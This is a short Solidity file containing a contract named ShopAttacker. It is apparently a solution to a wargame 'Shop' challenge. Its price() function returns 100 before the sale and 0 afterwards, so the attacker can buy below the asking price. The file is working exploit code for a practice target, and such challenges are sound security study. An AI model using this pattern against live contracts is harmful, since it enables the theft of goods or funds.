pragma solidity ^0.6.0;

import './21-Shop.sol';

abstract contract IShop {
  bool public isSold;
  function buy() external virtual;
}

contract ShopAttacker is Buyer {
  IShop challenge;

  constructor(address _challenge) public {
    challenge = IShop(_challenge);
  }
  
  function attack() public {
    challenge.buy();
  }
  
  function price() public view override returns (uint) {
    return challenge.isSold() ? 0 : 100;
  }
}
